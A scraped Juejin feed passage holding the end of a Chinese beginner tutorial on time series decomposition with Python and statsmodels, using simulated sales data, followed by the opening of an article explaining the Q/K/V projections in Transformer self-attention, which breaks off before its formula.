0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多刚入行的小伙伴问我：“<em>我想预测下个月公司的销售额，或者预测一下明天的股价，该学什么？</em>”</p>
<p>我的回答通常只有六个字：<strong>时间序列分析</strong>。</p>
<p>如果在数据分析的世界里有一种魔法能让你“预知未来”，那一定就是它。</p>
<h2 data-id="heading-0">1. 什么是时间序列？</h2>
<p>别被名词吓到了。简单来说，<strong>时间序列（Time Series）就是按时间顺序排列的一组数据</strong>。</p>
<p>比如：</p>
<ul>
<li>你手机里每天的步数记录；</li>
<li>某只股票每天的收盘价；</li>
<li>或者是你家楼下便利店每个月的营业额。</li>
</ul>
<p>这些数据都有一个共同点：<strong>有一个时间轴，且数据随着时间变化。</strong></p>
<p>我们做<strong>时间序列分析</strong>的<strong>核心目的</strong>，就是要从过去的**“历史数据”<strong>中找出规律，然后把这个规律延长到</strong>“未来”<strong>，这就是</strong>预测**。</p>
<h2 data-id="heading-1">2. 像剥洋葱一样拆解数据：时间序列的四大成分</h2>
<p>初学者最容易犯的错误是直接把数据丢进模型里跑。</p>
<p>作为一名老手，我要告诉你：<strong>看到数据，先拆解。</strong></p>
<p>通常，任何一个随时间变化的数据（比如一家奶茶店的日销量），都可以被拆分为<strong>四个部分</strong>。</p>
<h3 data-id="heading-2">2.1. 长期趋势--“大势所趋”</h3>
<p>这是数据在长时间内的主要运动方向。</p>
<ul>
<li><strong>例子</strong>：这家奶茶店开了三年，随着品牌知名度提升，整体销量每年都在涨。这就是<strong>趋势</strong>。</li>
<li><strong>地位</strong>：它是总变动的老大，决定了长期的方向。</li>
</ul>
<h3 data-id="heading-3">2.2. 季节变动--“春夏秋冬的轮回”</h3>
<p>数据受季节、节假日等固定周期影响而出现的波动。</p>
<ul>
<li><strong>例子</strong>：夏天天气热，冰饮卖得疯快；冬天冷，销量自然下滑；每到周末销量就比周一高。这种随着时间固定重复的波动，就是<strong>季节性</strong>。</li>
<li><strong>地位</strong>：它是总变动的老二，非常规律，预测起来最准。</li>
</ul>
<h3 data-id="heading-4">2.3. 循环变动--“难以捉摸的周期”</h3>
<p>这是一些周期较长、不固定的波动，通常和宏观经济有关。</p>
<ul>
<li><strong>例子</strong>：由于经济危机，大家钱包紧了，奶茶喝得少了。等经济复苏，又喝多了。</li>
<li><strong>注意</strong>：这部分原因复杂，周期不固定，我们在基础预测中通常<strong>不做重点考虑</strong>。</li>
</ul>
<h3 data-id="heading-5">2.4. 不规则变动--“老天爷的心情”</h3>
<p>这是随机的、不可控的波动。</p>
<ul>
<li><strong>例子</strong>：某天突然下暴雨，没人出门，销量暴跌；或者某天网红来打卡，销量暴涨。</li>
<li><strong>注意</strong>：这是“噪音”，在预测中我们很难捕捉它，通常假设它为0或忽略。</li>
</ul>
<blockquote>
<p><strong>（重点）：</strong><br/>
在实际的时间序列预测中，我们主要抓 <strong>“长期趋势” 和 “季节变动”</strong>。</p>
<p>抓住了这两条大鱼，预测的准确度通常能达到80%以上。</p>
<p>至于循环变动和不规则变动，因为占比小且太复杂，我们往往选择战略性忽略。</p>
</blockquote>
<h2 data-id="heading-6">3. 手把手教你：用Python拆解时间序列</h2>
<p>光说不练假把式。下面我们用<code>Python</code>代码模拟一组奶茶店的销售数据，并演示如何把这四个成分“拆”出来。</p>
<p>首先，构造“虚假”的奶茶店数据。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># === 第一步：构造数据 ===</span>
<span class="hljs-comment"># 假设我们有过去3年（36个月）的月度销售数据</span>
dates = pd.date_range(start=<span class="hljs-string">'2021-01-01'</span>, periods=<span class="hljs-number">36</span>, freq=<span class="hljs-string">'ME'</span>)

<span class="hljs-comment"># 1. 制造【长期趋势】：每个月销量基础增加 10 杯</span>
trend = np.linspace(<span class="hljs-number">100</span>, <span class="hljs-number">460</span>, <span class="hljs-number">36</span>)

<span class="hljs-comment"># 2. 制造【季节变动】：模拟每年夏天高、冬天低 (用正弦波模拟)</span>
<span class="hljs-comment"># 这里的逻辑是制造一个周期性的波浪</span>
seasonality = <span class="hljs-number">50</span> * np.sin(np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">3</span> * <span class="hljs-number">2</span> * np.pi, <span class="hljs-number">36</span>))

<span class="hljs-comment"># 3. 制造【不规则变动/噪音】：随机波动</span>
noise = np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">36</span>)

<span class="hljs-comment"># 4. 合成总销量</span>
total_sales = trend + seasonality + noise

<span class="hljs-comment"># 创建 DataFrame</span>
df = pd.DataFrame({<span class="hljs-string">'Date'</span>: dates, <span class="hljs-string">'Sales'</span>: total_sales})
df.set_index(<span class="hljs-string">'Date'</span>, inplace=<span class="hljs-literal">True</span>)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2d39a71777e48d5b1d6870e5ec5b8df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767519008&amp;x-signature=0Up1CFtrG2BldYY9pTVRIf3J8aA%3D" alt="" loading="lazy"/></p>
<p>然后，使用 <code>statsmodels</code> 库进行分解，它能帮我们一键拆解数据。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.seasonal <span class="hljs-keyword">import</span> seasonal_decompose

<span class="hljs-comment"># === 第二步：数据分解 ===</span>
<span class="hljs-comment"># model='additive' 表示加法模型（销量 = 趋势 + 季节 + 噪音）</span>
<span class="hljs-comment"># 如果波动幅度随着趋势变大而变大，通常用乘法模型 (multiplicative)</span>
decomposition = seasonal_decompose(df[<span class="hljs-string">'Sales'</span>], model=<span class="hljs-string">'additive'</span>)

<span class="hljs-comment"># === 第三步：绘图展示 ===</span>
fig = decomposition.plot()
fig.set_size_inches(<span class="hljs-number">12</span>, <span class="hljs-number">10</span>) <span class="hljs-comment"># 设置画布大小</span>
plt.show()
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0962196639c04f0dbc6f2cd3e9f14dbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767519008&amp;x-signature=9ks1nQe8cXYAYPvmXLnAxHY8%2F78%3D" alt="" loading="lazy"/></p>
<p>从上面四个子图可以看出：</p>
<ol>
<li><strong>Observed (原始数据)</strong>：你看到的真实销量曲线，上蹿下跳。</li>
<li><strong>Trend (趋势)</strong>：一条稳步向上的直线。这告诉老板：<em>放心，虽然每个月有波动，但咱们店整体是越做越好的！</em></li>
<li><strong>Seasonal (季节性)</strong>：非常有规律的波浪线。这告诉店长：<em>每年6-8月要多备货，12-1月可以安排员工轮休。</em></li>
<li><strong>Resid (残差/不规则项)</strong>：围绕0上下跳动的杂乱点。这是我们无法预测的随机事件。</li>
</ol>
<h2 data-id="heading-7">4. 分析师的内功：不仅仅是代码</h2>
<p>学会了上面的代码，你已经入门了。但作为过来人，我想告诉你，工具和算法虽然层出不穷，但<strong>分析思路</strong>才是万变不离其宗的。</p>
<p>首先，关注<strong>数据的平稳性</strong>，这是时间序列分析的门槛。</p>
<p>简单说，大部分复杂的统计模型（如ARIMA）都假设数据的性质（均值、方差）不随时间变化。</p>
<p>然而现实数据（如股价、销量）往往是不平稳的（有上涨趋势），因此如果你发现数据一直在涨，可以试着做<strong>差分</strong>（用今天的数减去昨天的数）。</p>
<p><strong>差分</strong>后的数据往往就平稳了，更容易放入模型去训练。</p>
<p>其次，结合<strong>业务场景</strong>，不要死记硬背模型，还要看场景。</p>
<p>比如：</p>
<ol>
<li><strong>场景A：电商大促预测（双11）</strong>
<ul>
<li><strong>特点</strong>：有极强的季节性（每年11月暴涨）。</li>
<li><strong>策略</strong>：重点分析<strong>季节变动</strong>。如果只看趋势，你会被双11的数据吓死，或者在双11备货不足。</li>
<li><strong>热点关联</strong>：就像分析“淄博烧烤”或“哈尔滨旅游”，必须考虑节假日这个强季节因子。</li>
</ul>
</li>
<li><strong>场景B：股票价格预测</strong>
<ul>
<li><strong>特点</strong>：不规则变动（噪音）极大，甚至噪音掩盖了趋势。</li>
<li><strong>策略</strong>：这种时候，简单的分解模型往往失效。需要引入更多外部变量（新闻、政策），或者使用更高级的深度学习模型。</li>
</ul>
</li>
<li><strong>场景C：服务器流量监控</strong>
<ul>
<li><strong>特点</strong>：白天高、深夜低，周末低、工作日高。</li>
<li><strong>策略</strong>：这是最标准的周期性数据，非常适合用来做异常检测（比如某天深夜流量突然暴涨，肯定是有黑客攻击或系统Bug，因为这违背了季节性规律）。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-8">5. 总结与建议</h2>
<p><strong>时间序列分析</strong>并没有想象中那么神秘。它的本质就是：<strong>承认历史会重演，但也接纳未来的不确定性。</strong></p>
<p>对于刚入行的朋友，我的建议是：</p>
<ol>
<li><strong>理解四大成分</strong>（趋势、季节、循环、噪音）是基础中的基础。</li>
<li><strong>抓住主要矛盾</strong>：在做预测时，优先搞定趋势和季节性。</li>
<li><strong>多动手尝试</strong>：比如把上面的<code>Python</code>代码跑一遍，尝试修改一下数据，看看结果有什么变化。</li>
</ol>
<p>未来的分析方法虽然会越来越多，AI也会越来越强，但这种 <strong>“透过现象（原始数据）看本质（趋势与规律）”</strong> 的分析思维，将是我们职业生涯中永恒不变的宝贵财富。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Self-Attention 为什么要做 QKV 的线性变换？又为什么要做 Softmax？]]></title>    <link>https://juejin.cn/post/7588080521446260782</link>    <guid>https://juejin.cn/post/7588080521446260782</guid>    <pubDate>2025-12-28T06:32:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588080521446260782" data-draft-id="7588139768275779635" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Self-Attention 为什么要做 QKV 的线性变换？又为什么要做 Softmax？"/> <meta itemprop="keywords" content="算法"/> <meta itemprop="datePublished" content="2025-12-28T06:32:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="coting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Self-Attention 为什么要做 QKV 的线性变换？又为什么要做 Softmax？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    coting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T06:32:19.000Z" title="Sun Dec 28 2025 06:32:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在看 Transformer 的 self-attention 结构时，很多人第一次见到 ( Q, K, V ) 三个矩阵都会有点疑惑：<br/>
明明输入就是一个向量序列，为什么还要多此一举做三次<strong>线性变换</strong>？<br/>
而且最后还要套上一个 <strong>Softmax</strong>，这又是在干什么？</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e586155be140446dbea559fa5b7aa6f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=7UNfPUXhzs%2F%2BRe9l4Ate0blNnM4%3D" alt="" loading="lazy"/></p>
<p>这两个问题，其实是理解注意力机制的核心关键。<br/>
我们从最直观的角度来拆开看。</p>
<p>所有相关源码示例、流程图、面试八股、模型配置与知识库构建技巧，我也将持续更新在Github：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faicoting%2FAIHub" target="_blank" title="https://github.com/aicoting/AIHub" ref="nofollow noopener noreferrer"><strong>AIHub</strong></a>，欢迎关注收藏！</p>
<h2 data-id="heading-0">一、为什么要 Q、K、V？</h2>
<p>假设我们有一个输入序列：<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86f8dbaf7c545d3b5cd5eb8ed0b7907~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=%2ByRuytzdHzQFm5eabxPm3H9M1NQ%3D" alt="image" loading="lazy"/></p>
<p>每个<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a9057db7085417d9782855af87577fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=LFY5Q5zOXUhl635nh5TMGulim7w%3D" alt="image" loading="lazy"/> 就是一个 token 的 embedding，比如一个词、一个字、或者一个图像 patch。<br/>
如果我们直接用这些<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/240fd555cf83454d9323b47e6204b997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=sMJBCqPE%2FNHGzNtO1nmLteYkV%2Fs%3D" alt="image" loading="lazy"/> 之间做点积：<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e438e1b00f0d43f9be1904d8b1cb7bea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=4Yhuda1E%2FQ9%2FMSaCCcEtv9N6dgs%3D" alt="image" loading="lazy"/></p>
<p>它确实能反映出两个 token 的相关性（越大越相关），但存在两个致命问题：</p>
<ol>
<li><strong>每个 token 的表示是静态的</strong>：输入 embedding 没有区分<strong>谁在关注别人</strong>还是<strong>被别人关注</strong>。</li>
<li><strong>无法表达不同的关注模式</strong>：所有 token 的关系都被一个固定空间描述，模型无法灵活学习不同角度的相似性。</li>
</ol>
<p>于是就引出了 Q、K、V 的设计。</p>
<h2 data-id="heading-1">二、Q、K、V 的线性变换在干什么？</h2>
<h3 data-id="heading-2">1.投影到不同子空间</h3>
<p>输入的特征维度是 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4d62ecac89f4b06b530a0dd448443ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=lxT54XhrMcuSK%2BDRYZDdZbUdBfE%3D" alt="image" loading="lazy"/>，每个 token 的 embedding 包含<strong>所有语义信息</strong>。</p>
<p>直接用原始 embedding 做 Q/K/V，相当于在同一个空间计算相似度，模型<strong>无法学习不同语义关系的权重</strong>。</p>
<p>我们把输入 ( X ) 分别线性变换成三种表示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c47ecaa73f844c98ba4c31eee678419~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=qadyxYmu1a9uA7SPWKiQNColD5k%3D" alt="image" loading="lazy"/></p>
<ul>
<li><strong>Query（查询）</strong>：表示我想关注什么信息</li>
<li><strong>Key（键）</strong>：表示我是什么样的信息</li>
<li><strong>Value（值）</strong>：表示我携带的信息内容</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e55b612b5f4a4d47ac965b091eb91af3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=S3yhVBcSteo0CMBjW9qE2a8YsQg%3D" alt="" loading="lazy"/></p>
<p>这三个矩阵其实是从同一个输入 (X) 投影出来的三种<strong>视角</strong>。<br/>
这一步的作用，就是<strong>让模型在不同子空间中理解 token 之间的关系</strong>。</p>
<p>举个简单的例子：<br/>
在一句话中，“他吃了一个苹果”，<br/>
“他”这个词（Query）可能更关注“吃”这个动词，而“吃”这个词（Key）可能更多地被名词吸引。</p>
<p>通过三组独立的线性变换，模型可以学习到这种不同角色的匹配关系。</p>
<p>所以你可以这样理解，Q 是注意力的<strong>提问方式</strong>，K 是信息的<strong>身份描述</strong>，V 是最终被提取的<strong>信息内容</strong>。</p>
<h3 data-id="heading-3">2.支持多头注意力</h3>
<p>多头注意力把 Q/K/V 切分成多个头，每个头关注不同子空间的特征。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97f0b5e3f83f47e1b160f3d457e16b93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=u7J5vXihvAUQ%2FnZ5fR5Tu%2FO0BHo%3D" alt="" loading="lazy"/></p>
<p>如果没有线性变换，每个头得到的还是原始 embedding，无法学习多角度关系。</p>
<p>线性投影允许每个 head <strong>独立学习一套查询/键/值表示</strong>，提升模型表达能力。</p>
<p>公式：</p>
